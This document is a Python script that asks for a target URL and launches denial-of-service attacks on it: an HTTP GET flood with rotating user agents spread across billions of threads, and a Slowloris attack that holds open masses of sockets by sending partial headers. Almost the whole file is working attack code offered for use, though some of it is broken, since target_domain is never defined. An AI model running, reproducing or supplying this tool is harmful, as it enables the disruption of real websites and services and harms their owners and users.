import requests
import socket
import random
import string
import time
import threading
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

# Configuration
target_url = input("Enter the target URL (e.g., https://www.example.com): ")
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15'
]
headers = [
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Accept-Language: en-US,en;q=0.5",
    "Accept-Encoding: gzip, deflate",
    "Connection: keep-alive",
    "Upgrade-Insecure-Requests: 1"
]

# HTTP Flood with Random User Agents and Headers
def http_flood():
    session = requests.Session()
    retry = Retry(connect=3, backoff_factor=0.5)
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)

    while True:
        user_agent = random.choice(user_agents)
        headers = {'User-Agent': user_agent}
        try:
            response = session.get(target_url, headers=headers)
            print(f'Status Code: {response.status_code}')
        except requests.exceptions.RequestException as e:
            print(f'Error: {e}')
        time.sleep(random.uniform(0.00000001, 0.00000002))  # Minimal sleep interval

# Slowloris Attack
def slowloris():
    sockets = []
    for _ in range(10000000000):  # Extremely increased number of connections
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_domain, 80))
        s.send(b"GET / HTTP/1.1\r\nHost: " + target_domain.encode() + b"\r\n")
        for header in headers:
            s.send(f"{header}\r\n".encode())
        s.send(b"\r\n")
        sockets.append(s)

    while True:
        for s in sockets:
            try:
                s.send(b"X-a: b\r\n")
            except:
                sockets.remove(s)
                s.close()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_domain, 80))
                s.send(b"GET / HTTP/1.1\r\nHost: " + target_domain.encode() + b"\r\n")
                for header in headers:
                    s.send(f"{header}\r\n".encode())
                s.send(b"\r\n")
                sockets.append(s)
        time.sleep(0.001)  # Minimal sleep time for maximum intensity

# Main function to start all attacks in separate threads
def main():
    threads = []
    for _ in range(5000000000):  # Extremely increased number of threads for HTTP flood
        thread = threading.Thread(target=http_flood)
        threads.append(thread)
        thread.start()

    slowloris_thread = threading.Thread(target=slowloris)
    threads.append(slowloris_thread)
    slowloris_thread.start()

    for thread in threads:
        thread.join()

if __name__ == '__main__':
    main()
